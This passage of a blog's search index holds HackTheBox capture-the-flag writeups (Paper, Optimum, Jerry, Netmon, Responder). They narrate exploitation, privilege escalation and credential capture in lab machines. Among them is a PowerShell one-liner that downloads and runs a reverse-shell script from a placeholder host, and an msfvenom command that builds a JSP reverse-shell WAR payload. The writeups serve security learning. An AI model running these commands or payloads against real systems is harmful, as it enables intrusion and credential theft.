","date":"19-06-2022","objectID":"/posts/htb/paper/:2:0","tags":["CVE-2019-17671","CVE-2021-3560","polkit","linpeas","gobuster","wordpress","hubot"],"title":"HackTheBox - Paper Writeup","uri":"/posts/htb/paper/"},{"categories":["HacktheBox"],"content":"Gobuster When I found a webpage, the first thing I’ll do is run the gobuster to find any hidden directory. Unfortunately, I can’t find anything useful. ","date":"19-06-2022","objectID":"/posts/htb/paper/:2:1","tags":["CVE-2019-17671","CVE-2021-3560","polkit","linpeas","gobuster","wordpress","hubot"],"title":"HackTheBox - Paper Writeup","uri":"/posts/htb/paper/"},{"categories":["HacktheBox"],"content":"Header: X-Backend-Server To be honest, I’m stuck and don’t know what to do. Then, I remember that I didn’t even check the header. I’m going to check it using the curl command. OH WOW! the X-Backend-Server just exposes the hostname called office.paper. So, I’ll add the hostname into the /etc/hosts file. hostname expose add hostname in /etc/hosts ","date":"19-06-2022","objectID":"/posts/htb/paper/:2:2","tags":["CVE-2019-17671","CVE-2021-3560","polkit","linpeas","gobuster","wordpress","hubot"],"title":"HackTheBox - Paper Writeup","uri":"/posts/htb/paper/"},{"categories":["HacktheBox"],"content":"Http: office.paper Then, I navigate to http://office.paper. Turns out, it’s a blog. Down to the footer, it says Proudly Powered by WordPress and this indicates it’s using WordPress as CMS. office.paper webpage The first thing I’ll do is start messing around with it. However, one comment sticks out. It says something about drafts is not secure and should be deleted ASAP. sensitive comment ","date":"19-06-2022","objectID":"/posts/htb/paper/:2:3","tags":["CVE-2019-17671","CVE-2021-3560","polkit","linpeas","gobuster","wordpress","hubot"],"title":"HackTheBox - Paper Writeup","uri":"/posts/htb/paper/"},{"categories":["HacktheBox"],"content":"CVE-2019-17671 As the comment above shown. The drafts section is not secure. So, with this information. I’m searching on the net about it and found this article with PoC and it got assigned as CVE-2019-17671. CVE description In WordPress before 5.2.4, unauthenticated viewing of certain content is possible because the static query property is mishandled. So, I’ll try to read the secret draft with this URL http://office.paper/?static=1 and it’s successfully retrieved. After I read it, I found the secret registration URL that leads into the chat subdomain. Like always, I’ll add it into the /etc/hosts file. hostname chat.office.paper expose add hostname chat.office.paper in /etc/hosts ","date":"19-06-2022","objectID":"/posts/htb/paper/:3:0","tags":["CVE-2019-17671","CVE-2021-3560","polkit","linpeas","gobuster","wordpress","hubot"],"title":"HackTheBox - Paper Writeup","uri":"/posts/htb/paper/"},{"categories":["HacktheBox"],"content":"Http: chat.office.paper I’m copying and pasting the URL in my web browser and being greeted by rocket.chat registration page. Well, I’m registering a new account and taking a look inside it. Turns out, it’s just a chat app and I can’t find anything useful. However, it’s has a bot called recyclops that can be interacted with. recyclops bot ","date":"19-06-2022","objectID":"/posts/htb/paper/:3:1","tags":["CVE-2019-17671","CVE-2021-3560","polkit","linpeas","gobuster","wordpress","hubot"],"title":"HackTheBox - Paper Writeup","uri":"/posts/htb/paper/"},{"categories":["HacktheBox"],"content":"Recyclops To interact with the bot, first, click the bot's profile and click the direct message button. So, I’ll try the help command first. There is some interesting stuff this bot can do. However, I’m interested in the Files and List commands. view help command ","date":"19-06-2022","objectID":"/posts/htb/paper/:4:0","tags":["CVE-2019-17671","CVE-2021-3560","polkit","linpeas","gobuster","wordpress","hubot"],"title":"HackTheBox - Paper Writeup","uri":"/posts/htb/paper/"},{"categories":["HacktheBox"],"content":"Recyclops: path traversal To invoke the list command, type recyclops list. It’s just giving me a listing of the /sales/ directory. However, this makes me wonder, can I make it list another directory as path traversal the answer is YES!. Here’s the command that I put in, recyclops list .. listing directory ","date":"19-06-2022","objectID":"/posts/htb/paper/:4:1","tags":["CVE-2019-17671","CVE-2021-3560","polkit","linpeas","gobuster","wordpress","hubot"],"title":"HackTheBox - Paper Writeup","uri":"/posts/htb/paper/"},{"categories":["HacktheBox"],"content":"Hubot There is a .ssh directory present and the Nmap scan shows, that this machine has port 22 open. Unfortunately, there’s nothing in that directory. On top of that, I found the directory called hubot. It’s a robot for a chat room. So, I assumed recyclops are based on hubot. ","date":"19-06-2022","objectID":"/posts/htb/paper/:5:0","tags":["CVE-2019-17671","CVE-2021-3560","polkit","linpeas","gobuster","wordpress","hubot"],"title":"HackTheBox - Paper Writeup","uri":"/posts/htb/paper/"},{"categories":["HacktheBox"],"content":"Hubot: /.env After listing the hubot directory. The file called .env really stands out above the rest. Here’s the command that I put in recyclops file ../hubot/.env to read the file. Finally, I found something useful this time. It is a password belonging to the recyclops user. Note: these creds also share with the dwight user and can be also SSH into the box found recyclops credentials ","date":"19-06-2022","objectID":"/posts/htb/paper/:5:1","tags":["CVE-2019-17671","CVE-2021-3560","polkit","linpeas","gobuster","wordpress","hubot"],"title":"HackTheBox - Paper Writeup","uri":"/posts/htb/paper/"},{"categories":["HacktheBox"],"content":"Hubot: RUN command Futher enumeration, I found the javascript file called run.js in the hubot/scripts directory. When I inspect the file, it executes the command with the RUN function. Well, let me try put the simple bash reverse shell. YES! successfully get the foothold as a dwight user. execute reverse shell shell as dwight ","date":"19-06-2022","objectID":"/posts/htb/paper/:5:2","tags":["CVE-2019-17671","CVE-2021-3560","polkit","linpeas","gobuster","wordpress","hubot"],"title":"HackTheBox - Paper Writeup","uri":"/posts/htb/paper/"},{"categories":["HacktheBox"],"content":"PEASS-ng: linpeas.sh I’m already in as dwight. First, I’ll check the sudo permission with sudo -l using the credentials found earliear. Unfortunatelly, dwight can’t run sudo in this machine. So, to make it quick, I’m going to run linpeas. execute linpeas ","date":"19-06-2022","objectID":"/posts/htb/paper/:6:0","tags":["CVE-2019-17671","CVE-2021-3560","polkit","linpeas","gobuster","wordpress","hubot"],"title":"HackTheBox - Paper Writeup","uri":"/posts/htb/paper/"},{"categories":["HacktheBox"],"content":"CVE-2021-3560 The linpeas script is already done running. OH WOW! it says this machine is vulnerable to CVE-2021-3560. The funny thing is when I searched on the internet about this CVE. I found secnigma github repos and this machine was created by secnigma. CVE description It was found that polkit could be tricked into bypassing the credential checks for D-Bus requests, elevating the privileges of the requestor to the root user. linpeas output The github repos itself is about bash PoC script. Also, the original research is done by Kevin Backhouse, and here’s his blog post talking about it. Well, it’s time to run the PoC script. Disclaimer: MULTIPLE TRIES ARE USUALLY REQUIRED for this exploit to work. transfer exploit become root I’M ROOT BABYYY! ","date":"19-06-2022","objectID":"/posts/htb/paper/:7:0","tags":["CVE-2019-17671","CVE-2021-3560","polkit","linpeas","gobuster","wordpress","hubot"],"title":"HackTheBox - Paper Writeup","uri":"/posts/htb/paper/"},{"categories":["HacktheBox"],"content":"Nmap First, let’s scan the IP address by using the Nmap # Nmap 7.92 scan initiated Fri Jun 10 19:25:32 2022 as: nmap -sC -sV -vv -p- --min-rate=10000 -oN nmap/optimum_all 10.10.10.8 Nmap scan report for 10.10.10.8 Host is up, received echo-reply ttl 127 (0.40s latency). Scanned at 2022-06-10 19:25:32 +08 for 25s Not shown: 65534 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 127 HttpFileServer httpd 2.3 | http-methods: |_ Supported Methods: GET HEAD POST |_http-title: HFS / |_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1 |_http-server-header: HFS 2.3 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jun 10 19:25:57 2022 -- 1 IP address (1 host up) scanned in 24.94 seconds Interesting, the only port open is 80 and the banner says HttpFileServer/HFS 2.3 ","date":"17-06-2022","objectID":"/posts/htb/optimum/:1:0","tags":["CVE-2014-6287","CVE-2016-0099","MS16-032","rce","reverse-powershell","httpfileserver","HFS","empire-project","windows-sysnative","powershell-arc"],"title":"HackTheBox - Optimum Writeup","uri":"/posts/htb/optimum/"},{"categories":["HacktheBox"],"content":"HFS (HttpFileServer) Description HTTP File Server, otherwise known as HFS, is a free web server specifically designed for publishing and sharing files. It’s different from classic file sharing because it uses web technology to be more compatible with today’s Internet. resource: wikipedia I navigate to the port 80 through the web browser. WOW! it’s just a simple webpage and its also can search files,? I believed. Well, this box is really old by the time I’m writing this. Like always I’m asking google about this information and waiting for the result to come in. HFS webpage ","date":"17-06-2022","objectID":"/posts/htb/optimum/:2:0","tags":["CVE-2014-6287","CVE-2016-0099","MS16-032","rce","reverse-powershell","httpfileserver","HFS","empire-project","windows-sysnative","powershell-arc"],"title":"HackTheBox - Optimum Writeup","uri":"/posts/htb/optimum/"},{"categories":["HacktheBox"],"content":"CVE-2014-6287 Upon searching on the internet. I found this HFS version is vulnerable to RCE (remote command execution) and got assigned to a CVE-2014-6287. I also found this article with a payload sample. CVE description The findMacroMarker function in parserLib.pas in Rejetto HTTP File Server (aks HFS or HttpFileServer) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via a %00 sequence in a search action. ","date":"17-06-2022","objectID":"/posts/htb/optimum/:2:1","tags":["CVE-2014-6287","CVE-2016-0099","MS16-032","rce","reverse-powershell","httpfileserver","HFS","empire-project","windows-sysnative","powershell-arc"],"title":"HackTheBox - Optimum Writeup","uri":"/posts/htb/optimum/"},{"categories":["HacktheBox"],"content":"Burpsuite I already have the payload sample and I’m gonna try it out with simple command. The command is whoami. First, I intercept the search endpoint with burpsuite. Then, send the request through the repeater and put the payload in the search query. However, it didn’t display any output from my whoami command. Then, I remembered about the ping command. So, I try to ping myself to see, if I get the connection through the box. ping myself receiving the ping request ","date":"17-06-2022","objectID":"/posts/htb/optimum/:2:2","tags":["CVE-2014-6287","CVE-2016-0099","MS16-032","rce","reverse-powershell","httpfileserver","HFS","empire-project","windows-sysnative","powershell-arc"],"title":"HackTheBox - Optimum Writeup","uri":"/posts/htb/optimum/"},{"categories":["HacktheBox"],"content":"Nishang: Invoke-PowerShellTcp.ps1 The command runs successfully, with this information, I’m gonna try to gain a foothold on the box with nishang reverse shell script. Check this blog where I configure the reverse shell script. First, I created a new directory called www and put the reverse shell script in the same directory. Then, I’m hosting the python web server in port 80 and run the nc listener with rlwrap since this is a Windows machine. Back to the burpsuite, I use this payload, which is downloading the reverse shell script and executing it. Don't forget the (dot) at the end. serve python server execute reverse shell shell as kostas NICE!. Finally, I’m in as a kostas user. Since this is an old machine from HacktheBox, I’m gonna assume they are plenty of exploits on the internet waiting to be found. Well, I’m going to check this machine system with the systeminfo command first. systeminfo ","date":"17-06-2022","objectID":"/posts/htb/optimum/:3:0","tags":["CVE-2014-6287","CVE-2016-0099","MS16-032","rce","reverse-powershell","httpfileserver","HFS","empire-project","windows-sysnative","powershell-arc"],"title":"HackTheBox - Optimum Writeup","uri":"/posts/htb/optimum/"},{"categories":["HacktheBox"],"content":"MS16-032 : CVE-2016-0099 This is a Windows Server 2012R2 version 6.3.9600 N/A Build 9600 and the architecture type is 64 bit. Upon searching this version on the net. I realize this version is vulnerable to a lot of things. However, I’m gonna abuse the Secondary Logon Service to gain the SYSTEM shell that is dubbed as MS16-032 or CVE-2016-0099. ","date":"17-06-2022","objectID":"/posts/htb/optimum/:3:1","tags":["CVE-2014-6287","CVE-2016-0099","MS16-032","rce","reverse-powershell","httpfileserver","HFS","empire-project","windows-sysnative","powershell-arc"],"title":"HackTheBox - Optimum Writeup","uri":"/posts/htb/optimum/"},{"categories":["HacktheBox"],"content":"EmpireProject: Invoke-MS16032.ps1 I manage to find this exploit in the exploit-db. However, the exploit itself didn’t work in my case because it’s open the cmd through GUI and I don’t have access to the GUI instance. Luckily, I found the powershell exploit that allows me to privesc from the EmpireProject. EmpireProject Is a post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent. It is the merge of the previous PowerShell Empire and Python EmPyre projects. resource: EmpireProject github So, I’m gonna download it with the wget command. Then, edit the file by putting the example in the last line also edit the URL to point into my python server with another reverse shell called yeet.ps1 Note: the example start with Invoke-MS16-032. However, the function is named Invoke-MS16032 download the exploit exploit example edit the exploit ","date":"17-06-2022","objectID":"/posts/htb/optimum/:3:2","tags":["CVE-2014-6287","CVE-2016-0099","MS16-032","rce","reverse-powershell","httpfileserver","HFS","empire-project","windows-sysnative","powershell-arc"],"title":"HackTheBox - Optimum Writeup","uri":"/posts/htb/optimum/"},{"categories":["HacktheBox"],"content":"Windows: sysnative I tried a bunch of times to run this exploit but the result is nothing. This machine is 64 bit and also the exploit is tested on a 64 bit 2k12R2 server. Now, I’m dumbfounded. Then, I realize maybe the powershell itself running on another architecture. So, I check, and it’s confirmed. The powershell is running on 32 bit. exploit compatibility check powershell architecture With quick googling, I found this answer on stackoverflow. I need to run the powershell in the sysnative directory to get the 64 bit version. Well, I need to restart over again. So, back again to the burpsuite and put this as the payload. Then, catch the shell with nc. C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe \"IEX(New-Object Net.WebClient).DownloadString('http://example.com/Invoke-PowerShellTcp.ps1')\" When I checked the powershell architecture indeed it is running on 64 bit. YES!!! using 64bit powershell ","date":"17-06-2022","objectID":"/posts/htb/optimum/:3:3","tags":["CVE-2014-6287","CVE-2016-0099","MS16-032","rce","reverse-powershell","httpfileserver","HFS","empire-project","windows-sysnative","powershell-arc"],"title":"HackTheBox - Optimum Writeup","uri":"/posts/htb/optimum/"},{"categories":["HacktheBox"],"content":"Windows: Privilege Escalation Now, I’m executing the privesc exploit once again. My python server shows the request from the file called Invoke-MS16032.ps1 followed with yeet.ps1 and finally, I’ve got a shell as system. shell as nt authority\\system ","date":"17-06-2022","objectID":"/posts/htb/optimum/:4:0","tags":["CVE-2014-6287","CVE-2016-0099","MS16-032","rce","reverse-powershell","httpfileserver","HFS","empire-project","windows-sysnative","powershell-arc"],"title":"HackTheBox - Optimum Writeup","uri":"/posts/htb/optimum/"},{"categories":["HacktheBox"],"content":"Nmap As always, I’m gonna start with the Nmap scan with this IP address 10.10.10.95 # Nmap 7.92 scan initiated Tue Mar 1 07:29:58 2022 as: nmap -sC -sV -p- -oN nmap/jerry_all 10.10.10.95 Nmap scan report for 10.10.10.95 Host is up (0.060s latency). Not shown: 65534 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 |_http-server-header: Apache-Coyote/1.1 |_http-favicon: Apache Tomcat |_http-title: Apache Tomcat/7.0.88 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Mar 1 07:36:10 2022 -- 1 IP address (1 host up) scanned in 371.74 seconds One port just opens at 8080 and it is Apache Tomcat. Well, this machine is straightforward. So, I’m gonna show, you how to exploit it with msfvenom and web shell. Let’s go. ","date":"04-06-2022","objectID":"/posts/htb/jerry/:1:0","tags":["msfvenom","jsp-reverse-shell","jsp-webshell","war-file","apache-tomcat"],"title":"HackTheBox - Jerry Writeup","uri":"/posts/htb/jerry/"},{"categories":["HacktheBox"],"content":"Http (Apache Tomcat) Let’s take a look at port 8080 which serve as Http. apache default page It’s just an Apache Tomcat default page after installations. So, I’ll try to play around. Then, I found the /manager/html section upon clicking the Manager App button. Also, I found the credentials on the error page. found credentials in error page ","date":"04-06-2022","objectID":"/posts/htb/jerry/:1:1","tags":["msfvenom","jsp-reverse-shell","jsp-webshell","war-file","apache-tomcat"],"title":"HackTheBox - Jerry Writeup","uri":"/posts/htb/jerry/"},{"categories":["HacktheBox"],"content":"/manager/html On this page, we can upload the WAR file to the server. Then, I’m thinking maybe I can upload some sort of shell since this is an old version of Apache Tomcat. upload button ","date":"04-06-2022","objectID":"/posts/htb/jerry/:1:2","tags":["msfvenom","jsp-reverse-shell","jsp-webshell","war-file","apache-tomcat"],"title":"HackTheBox - Jerry Writeup","uri":"/posts/htb/jerry/"},{"categories":["HacktheBox"],"content":"WebShell With light googling, I found this webshell. So, I’m gonna create a new directory called xploit. Then, download it with the wget command in xploit dir. However, we wanted in form of a WAR file to be able to upload it. Let’s convert this .jsp file into .WAR file. convert jsp to war file If the command successfully ran. There will be a new file created in your current directory. In this case, my xploit directory. Now, Let’s upload the newly created web shell to the server. It went through and didn’t throw any errors. upload war webshell file To spawn the shell, just click the /webshell path in the table. whoami nt authority\\system WOW! we just became nt authority\\system user. Furthermore, you can upload the nishang reverse shell to get a proper shell. ","date":"04-06-2022","objectID":"/posts/htb/jerry/:2:0","tags":["msfvenom","jsp-reverse-shell","jsp-webshell","war-file","apache-tomcat"],"title":"HackTheBox - Jerry Writeup","uri":"/posts/htb/jerry/"},{"categories":["HacktheBox"],"content":"MSFVenom If you like to get a reverse shell straight away. We can use the msfvenom payload and get the connection back through nc. First, let’s create the payload with this command; and make sure to start the listener as well. msfvenom -p java/jsp_shell_reverse_tcp LHOST=your_ip LPORT=any_port -f war -o shell.war msfvenom create war payload The last step is, to upload it into this machine and double-click the /shell. ET VOILA shell as nt authority\\system ","date":"04-06-2022","objectID":"/posts/htb/jerry/:3:0","tags":["msfvenom","jsp-reverse-shell","jsp-webshell","war-file","apache-tomcat"],"title":"HackTheBox - Jerry Writeup","uri":"/posts/htb/jerry/"},{"categories":["HacktheBox"],"content":"Nmap First, let’s scan the IP address by using the Nmap # Nmap 7.92 scan initiated Thu May 26 02:11:18 2022 as: nmap -sC -sV -vv -T4 -p- -oN nmap/netmon_all 10.10.10.152 Nmap scan report for 10.10.10.152 Host is up, received echo-reply ttl 127 (0.048s latency). Scanned at 2022-05-26 02:11:19 +08 for 126s Not shown: 65522 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 127 Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 02-03-19 12:18AM 1024 .rnd | 02-25-19 10:15PM \u003cDIR\u003e inetpub | 07-16-16 09:18AM \u003cDIR\u003e PerfLogs | 02-25-19 10:56PM \u003cDIR\u003e Program Files | 02-03-19 12:28AM \u003cDIR\u003e Program Files (x86) | 02-03-19 08:08AM \u003cDIR\u003e Users |_02-25-19 11:49PM \u003cDIR\u003e Windows | ftp-syst: |_ SYST: Windows_NT 80/tcp open http syn-ack ttl 127 Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor) |_http-server-header: PRTG/18.1.37.13946 |_http-trane-info: Problem with XML parsing of /evox/about |_http-favicon: Unknown favicon MD5: 36B3EF286FA4BEFBB797A0966B456479 | http-title: Welcome | PRTG Network Monitor (NETMON) |_Requested resource was /index.htm | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 47001/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49665/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49666/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49667/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49668/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49669/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2022-05-25T18:13:22 |_ start_date: 2022-05-25T16:09:05 | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required | smb-security-mode: | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 33374/tcp): CLEAN (Couldn't connect) | Check 2 (port 40209/tcp): CLEAN (Couldn't connect) | Check 3 (port 15668/udp): CLEAN (Failed to receive data) | Check 4 (port 46849/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked |_clock-skew: mean: 0s, deviation: 0s, median: 0s Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu May 26 02:13:25 2022 -- 1 IP address (1 host up) scanned in 127.45 seconds That’s a lot of open ports. Port 21/ftp really caught my eyes. In this scan, it says Anonymous FTP login allowed. So, let’s check it out. ","date":"28-05-2022","objectID":"/posts/htb/netmon/:1:0","tags":["CVE-2018-9276","evil-winrm","PRTG-netmon","ftp","paessler","rce","PRTG-netmon-default-creds"],"title":"HackTheBox - Netmon Writeup","uri":"/posts/htb/netmon/"},{"categories":["HacktheBox"],"content":"FTP (File Transfer Protocol) Successfully login as an anonymous user. OH WOW!. Looks like we’ve got the entire directory of the server. In this case, the server running Windows. On top of that, I’ve got the user flag in the /Users/Public directory. ftp anonymous ","date":"28-05-2022","objectID":"/posts/htb/netmon/:2:0","tags":["CVE-2018-9276","evil-winrm","PRTG-netmon","ftp","paessler","rce","PRTG-netmon-default-creds"],"title":"HackTheBox - Netmon Writeup","uri":"/posts/htb/netmon/"},{"categories":["HacktheBox"],"content":"Http (PRTG Network Monitor) The Nmap scan above also reveals, that port 80/http is open and the title was Welcome | PRTG Network Monitor (NETMON). Now, let’s check the http site. It’s just a login page. First, I’m gonna try the default credentials prtgadmin:prtgadmin. Unfortunately, it didn’t work but luck is on our side. We already have the access to the server file system through FTP. login page ","date":"28-05-2022","objectID":"/posts/htb/netmon/:3:0","tags":["CVE-2018-9276","evil-winrm","PRTG-netmon","ftp","paessler","rce","PRTG-netmon-default-creds"],"title":"HackTheBox - Netmon Writeup","uri":"/posts/htb/netmon/"},{"categories":["HacktheBox"],"content":"Paessler So, I went googling around the internet and found this article about; where does PRTG store its data. The Data directory is stored in a folder called Paessler that locate in programdata. To be honest, I am stuck at this point cause I didn’t even see the directory called programdata. Then, I’m just playing around in the file system and finally found it. Turns out, it’s located in the root directory /programdata. found Paessler directory ","date":"28-05-2022","objectID":"/posts/htb/netmon/:3:1","tags":["CVE-2018-9276","evil-winrm","PRTG-netmon","ftp","paessler","rce","PRTG-netmon-default-creds"],"title":"HackTheBox - Netmon Writeup","uri":"/posts/htb/netmon/"},{"categories":["HacktheBox"],"content":"PRTG Configuration.old.bak Then, I found the PRTG Configuration files locate in the directory /programdata/Paessler/PRTG Network Monitor. The .bak extensions caught my eyes. So, I ended up downloading the 3 config files with the get command. downloading the config file I manage found the password inside the PRTG Configuration.old.bak file. So, let’s try login in with these found credentials. Unfortunately, it doesn’t work. found credentials Upon inspection, I found that the file called PRTG Configuration.old.bak was created back in 2018, and the 2 other files were created in 2019. So, I’m gonna assumed the developers are so lazy and not careful enough with the password. Now, I’m gonna change the password to end with 2018 into 2019. Let’s try it out. date differences ","date":"28-05-2022","objectID":"/posts/htb/netmon/:3:2","tags":["CVE-2018-9276","evil-winrm","PRTG-netmon","ftp","paessler","rce","PRTG-netmon-default-creds"],"title":"HackTheBox - Netmon Writeup","uri":"/posts/htb/netmon/"},{"categories":["HacktheBox"],"content":"Http (Welcome PRTG System Administrator!) PRTG admin webpage YES!!! IT WORKS!!! This admin page, reveals the version of the software version 18.1.37.13946. Then, I ask google nicely and found this article. The article is about Command Injection Vulnerability and got assigned to a CVE-2018-9276. ","date":"28-05-2022","objectID":"/posts/htb/netmon/:3:3","tags":["CVE-2018-9276","evil-winrm","PRTG-netmon","ftp","paessler","rce","PRTG-netmon-default-creds"],"title":"HackTheBox - Netmon Writeup","uri":"/posts/htb/netmon/"},{"categories":["HacktheBox"],"content":"RCE (Remote Code Execution) Then, I’ll try to search the exploit in the searchsploit databases and find, one that has (Authenticated) RCE. We are in luck because I’ve already got the admin credentials. So, I’m gonna copy the exploit into my current directory with the -m flag. search the exploit in searchsploit The exploit needed the admin cookies. Then, Its gonna created the user called pentest in the admin groups. In the Nmap scan result above, we see that port 5985 is open. The exploit successfully ran. Let’s connected to the machine through the credentials pentest:P3nT3st! execute the exploit become administrator NICE! ","date":"28-05-2022","objectID":"/posts/htb/netmon/:4:0","tags":["CVE-2018-9276","evil-winrm","PRTG-netmon","ftp","paessler","rce","PRTG-netmon-default-creds"],"title":"HackTheBox - Netmon Writeup","uri":"/posts/htb/netmon/"},{"categories":["HacktheBox"],"content":"I found two ways to gain into this machine. First, stealing the password hash by using the responder and then logon through evil-winrm. Second, gaining the remote code execution through log poisoning and getting the reverse shell. ","date":"09-04-2022","objectID":"/posts/htb/responder/:0:0","tags":["lfi","rce","log-poisoning","responder.py","NTLMv2","hashcat","reverse-powershell","php-webshell","evil-winrm"],"title":"HackTheBox - Responder Writeup","uri":"/posts/htb/responder/"},{"categories":["HacktheBox"],"content":"Nmap Let’s scan the Ip address first by using Nmap. ","date":"09-04-2022","objectID":"/posts/htb/responder/:1:0","tags":["lfi","rce","log-poisoning","responder.py","NTLMv2","hashcat","reverse-powershell","php-webshell","evil-winrm"],"title":"HackTheBox - Responder Writeup","uri":"/posts/htb/responder/"},{"categories":["HacktheBox"],"content":"result # Nmap 7.92 scan initiated Sat Apr 9 04:18:54 2022 as: nmap -sC -sV -p- -oN nmap/responder_all 10.129.101.69 Nmap scan report for 10.129.101.69 Host is up (0.42s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1) |_http-title: Site doesn't have a title (text/html; charset=UTF-8). |_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 7680/tcp open tcpwrapped Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Apr 9 04:35:03 2022 -- 1 IP address (1 host up) scanned in 968.69 seconds That’s not a lot of open ports. ","date":"09-04-2022","objectID":"/posts/htb/responder/:1:1","tags":["lfi","rce","log-poisoning","responder.py","NTLMv2","hashcat","reverse-powershell","php-webshell","evil-winrm"],"title":"HackTheBox - Responder Writeup","uri":"/posts/htb/responder/"},{"categories":["HacktheBox"],"content":"First Method ","date":"09-04-2022","objectID":"/posts/htb/responder/:2:0","tags":["lfi","rce","log-poisoning","responder.py","NTLMv2","hashcat","reverse-powershell","php-webshell","evil-winrm"],"title":"HackTheBox - Responder Writeup","uri":"/posts/htb/responder/"},{"categories":["HacktheBox"],"content":"Http The Nmap scan result shows this machine has a webserver on port 80. When I put the Ip address in the url bar it’s redirected me to unika.htb redirect to unika.htb To solve this issue, put the Ip address of this machine in the /etc/hosts file and give it a name. In this case, the name is unika.htb and save it. Now, just refresh the page, and BOOM! add hostname in /etc/hosts unika webpage ","date":"09-04-2022","objectID":"/posts/htb/responder/:2:1","tags":["lfi","rce","log-poisoning","responder.py","NTLMv2","hashcat","reverse-powershell","php-webshell","evil-winrm"],"title":"HackTheBox - Responder Writeup","uri":"/posts/htb/responder/"},{"categories":["HacktheBox"],"content":"Local File Inclusion/LFI I’m started playing around with the website. Then, I found a button on the top navigation bar that you can change the language. When clicking any of the languages to change. The url became looks like this http://unika.htb/index.php?page=french.html Every time I saw this kinda url with the parameter with it. I usually try to do local file inclusion first. In this case, I’m using the PHP wrapper because it’s kinda easy for me. Let’s hit the hosts file in the Windows that locate here C:/WINDOWS/System32/drivers/etc/hosts and BOOM! php wrapper read file With this information. We can get access to this machine with Log Poisoing. However, the question asks something about Responder utility. ","date":"09-04-2022","objectID":"/posts/htb/responder/:2:2","tags":["lfi","rce","log-poisoning","responder.py","NTLMv2","hashcat","reverse-powershell","php-webshell","evil-winrm"],"title":"HackTheBox - Responder Writeup","uri":"/posts/htb/responder/"},{"categories":["HacktheBox"],"content":"Responder.py Every starting-point machine has a walkthrough pdf file to download. So, I download it and read the Using Responder section. That’s no shame to read the walkthrough to learn. Well, I’m kinda lost reading those sections but I found this article kali:forums - How to use Responder.py to Steal Credentials and it kinda makes sense to my small brain :). Here’s the article that got highlighted from the pdf file HackTricks - places to steal ntlm creds Enough with all of this, let’s try to steal the hash. First, let’s run the responder with sudo privilege and specify the tun0 as the interface with tag -I. Now, add the “share” in the url bar at the page parameter. Make sure to use your tun0 Ip address and the “share” can be anything. responder access yeet share respond with hash The image above shows that the responder successfully grab the NTLMv2 hash. ","date":"09-04-2022","objectID":"/posts/htb/responder/:2:3","tags":["lfi","rce","log-poisoning","responder.py","NTLMv2","hashcat","reverse-powershell","php-webshell","evil-winrm"],"title":"HackTheBox - Responder Writeup","uri":"/posts/htb/responder/"},{"categories":["HacktheBox"],"content":"Hashcat Well, I got the hash already and put it in the file called admin.hash and the last thing to do is crack it. I love hashcat so much and that’s the one I’m gonna use it. Let’s run it with mode 5600 for the NTLMv2 hash and I’m gonna use rockyou.txt as my wordlist. hashcat cracked administrator hash YES! Finally! I’ve got the password. ","date":"09-04-2022","objectID":"/posts/htb/responder/:2:4","tags":["lfi","rce","log-poisoning","responder.py","NTLMv2","hashcat","reverse-powershell","php-webshell","evil-winrm"],"title":"HackTheBox - Responder Writeup","uri":"/posts/htb/responder/"},{"categories":["HacktheBox"],"content":"Evil-WinRM Based on the Nmap scan result. The port 5985 is open, which is Windows Remote Management (winrm). Let’s try to connect to it with these credentials. login as administrator NICE! ","date":"09-04-2022","objectID":"/posts/htb/responder/:2:5","tags":["lfi","rce","log-poisoning","responder.py","NTLMv2","hashcat","reverse-powershell","php-webshell","evil-winrm"],"title":"HackTheBox - Responder Writeup","uri":"/posts/htb/responder/"},{"categories":["HacktheBox"],"content":"Second Method 